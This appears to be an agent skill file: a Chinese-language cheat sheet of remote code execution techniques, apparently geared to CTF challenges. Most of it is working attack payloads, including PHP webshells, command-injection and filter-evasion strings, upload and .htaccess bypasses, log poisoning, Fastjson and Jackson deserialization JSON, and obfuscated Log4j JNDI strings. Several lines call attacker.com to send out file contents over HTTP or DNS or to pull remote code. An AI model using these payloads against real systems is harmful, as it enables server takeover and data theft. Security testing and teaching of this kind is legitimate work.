---
name: rce-rce-detail
description: Use when encountering 命令注入、代码执行漏洞利用技术
---

# 远程代码执行

## Info

- **Domain**: web
- **Tags**: web, rce, command-injection

# RCE详细分类

## 1. PHP代码执行

```php
<?php system($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php popen($_GET['cmd'],'r'); ?>
<?php assert($_POST['cmd']); ?>
<?php preg_replace('/.*/e',$_POST['cmd'],''); ?>
<?php call_user_func($_POST['cmd']); ?>
<?php $cmd=$_GET['cmd']; eval($cmd); ?>
```

---

## 2. PHP Filter链

```
php://filter/convert.base64-encode/resource=config.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/zlib.deflate/convert.base64-encode/resource=config.php
```

---

## 3. 命令注入

```
; whoami
| whoami
& whoami
&& whoami
|| whoami
$(whoami)
`whoami`
```

### 盲命令注入

Linux:
```
sleep 5
ping -c 5 127.0.0.1
```

Windows:
```
timeout /t 5
ping -n 5 127.0.0.1
```

---

## 4. PHP反序列化

```php
O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"cmd";s:2:"id";}
```

### CVE利用

- CVE-2019-9081 (Laravel)
- CVE-2020-15148 (Laravel)

---

## 5. Java反序列化

使用ysoserial:

```bash
java -jar ysoserial.jar CommonsCollections1 "command"
java -jar ysoserial.jar CommonsCollections2 "command"
java -jar ysoserial.jar GadgetChain1 "command"
java -jar ysoserial.jar Groovy1 "command"
```

### 常见Gadget

- CommonsCollections1-7
- Spring1
- JBoss
- Clojure
- Kotlin

---

## 6. 文件上传漏洞

### 基础绕过

```
filename=shell.php
filename=shell.jpg (包含PHP代码)
Content-Type: image/jpeg
```

### 扩展名绕过

```
shell.php
shell.php5
shell.php4
shell.php3
shell.phtml
shell.phar
```

### 双扩展名

```
shell.php.jpg
shell.jpg.php
```

### 00截断

```
shell.php%00.jpg
shell.php .jpg
```

### .htaccess

```
AddType application/x-httpd-php .jpg
<FilesMatch "jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

### .user.ini

```
auto_prepend_file=shell.jpg
auto_append_file=shell.jpg
```

### 图片马

```bash
copy 1.jpg /b + shell.php /b shell.jpg
```

---

## 7. 文件包含RCE

### 本地文件包含

```
?page=../../../../etc/passwd
?page=/var/www/html/config.php
```

### 远程文件包含

```
?page=http://attacker.com/shell.txt
?page=php://input
```

### 伪协议

```
php://filter/convert.base64-encode/resource=config.php
php://input
data://text/plain,<?php system('id');?>
expect://id
```

---

## 8. 日志投毒RCE

### Apache日志

```
访问: <?php system($_GET['cmd']);?>
?page=/var/log/apache2/access.log&cmd=whoami
```

### SSH日志

```
ssh "<?php system('id');?>"@target.com
?page=/var/log/auth.log&cmd=id
```

---

## 9. 图片马RCE

```bash
# 生成图片马
copy 1.jpg /b + shell.php /b shell.jpg

# 上传后包含
?page=upload/shell.jpg
```

---

## 10. .htaccess利用

```
# 方法1: AddType
AddType application/x-httpd-php .jpg

# 方法2: SetHandler
<FilesMatch "jpg">
SetHandler application/x-httpd-php
</FilesMatch>

# 方法3: php_value
php_value auto_prepend_file "shell.jpg"
```

---

## 11. 反序列化漏洞

### Fastjson

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["base64"],"_name":"a","_tfactory":{},"_outputProperties":{}}
```

### Jackson

```json
{"@class":"java.lang.ProcessBuilder","@constructor_args":[{"@type":"java.util.ArrayList","@items":["calc.exe"]}],"start":""}
```

### Log4j (CVE-2021-44228)

```
${jndi:ldap://attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
```

### Log4j WAF 绕过
```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
${${env:NaN:-j}sdn:NaN:-i}:${lower:l}${lower:d}a${lower:p}://attacker.com/a}
${upper:j}ndi:ldap://attacker.com/a
```

---

## 17. 命令执行高级技巧

### 关键词分割绕过
```bash
# 单引号分割
cat''t fl''ag
ca\t fl\ag
cat$@t fl$@ag

# 变量拼接
a=f&&b=lag&&c=ca&&d=t&&$c$d $a$b

# 通配符
cat f*
cat f???
cat fla[f-h]
```

### 编码绕过
```bash
# Base64 编码（bash/sh/. 均可执行）
echo "Y2F0IGYq" | base64 -d | bash
echo "Y2F0IGYq" | base64 -d | sh
echo "Y2F0IGYq" | base64 -d .

# 十六进制编码（xxd）
echo "63617420666c6167" | xxd -r -p | bash

# 八进制编码
cat $'\146\154\141\147'
```

### 斜杠 / 绕过
```bash
# 通过 PATH 变量获取 /
echo ${PATH:0:1}   # 输出 /
${PATH:0:1}bin${PATH:0:1}cat ${PATH:0:1}flag
```

### PHP 动态函数调用
```php
<?php
// 函数名不区分大小写
SyStEm('whoami');

// 动态拼接
$func = 'sys'.'tem'; $func('whoami');
('fil'.'e_get_contents')('/var/www/html/index.php');

// 十六进制函数名
("\x70\x68\x70\x69\x6e\x66\x6f")();  // phpinfo()

// Base64 动态调用
base64_decode('c2hvd19zb3VyY2U=')('index.php');  // show_source

// 八进制/十六进制/Unicode
"\163\171\163\164\145\155"('whoami');
"\u{73}\u{79}\u{73}\u{74}\u{65}\u{6d}"('id');
?>
```

### 无数字字母 RCE（PHP < 8.3）
```php
<?php
// 自增法：'a'++ => 'b', 'b'++ => 'c'
// 利用 $_=[]._ 得到 "Array"，取首字母 "A"
$_=[]._;       // "Array"
$_=$_[_];     // "A"
$_++;         // "B" ... 可递推出所有字母

// 完整 Payload（POST: _=system&__=cat /f*）
$_=[]._[_];$_=$_[_];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_=$___.$__.$_;$_=_.$_;$$_[_]($$_[__]);

// 完整 Payload（POST: _=phpinfo()）
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;
// 需 URL 编码
?>
```

### 无参数 RCE
```php
<?php
// 扫描当前目录
var_dump(scandir(current(localeconv())));

// 随机读取当前目录文件
highlight_file(array_rand(array_flip(scandir(getcwd()))));

// 查看上级目录
print_r(scandir(dirname(getcwd())));

// 读取上级目录文件
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));

// 通过 crypt + hebrevc
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));
?>
```

### 通过 Session ID 执行命令
```php
<?php
// 把命令十六进制写入 PHPSESSID Cookie
?code=eval(hex2bin(session_id(session_start())));
// Cookie: PHPSESSID=73797374656d2827636174202f666c61672729
?>
```

### 通过请求头执行
```php
<?php
var_dump(end(getallheaders()));
// 在 HTTP 请求最后一行加：X-Cmd: system('whoami');
?>
```

### 通过变量定义执行
```php
<?php
// POST 参数: a=eval(end(current(get_defined_vars())));&b=system('ls /');
?>
```

### 无引号 RCE
```php
<?php
// 通过 chr() 拼出路径
var_dump(scandir(chr(47)));   // chr(47) = /
var_dump(file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103)));
?>
```

---

## 18. RCE 无回显利用

### tee 命令写入文件
```bash
# 将结果写入文件，然后访问文件读取
?cmd=ls / | tee 1.txt
```

### cp 复制文件
```bash
cp /flag .
cp /f* /dev/stdout
```

### DNS 外带
```bash
# Linux
nslookup $(cat /flag).attacker.com
curl http://attacker.com/$(cat /flag)

# Windows
for /F %i in (C:\flag.txt) do nslookup %i.attacker.com
```

---

## 19. 日志投毒 RCE

### Apache 日志
```
# 访问 URL 注入 PHP 代码
GET /<?php system($_GET['cmd']);?> HTTP/1.1
# 包含日志
?page=/var/log/apache2/access.log&cmd=whoami
```

### SSH 日志
```bash
ssh "<?php system('id');?>"@target.com
?page=/var/log/auth.log&cmd=id
```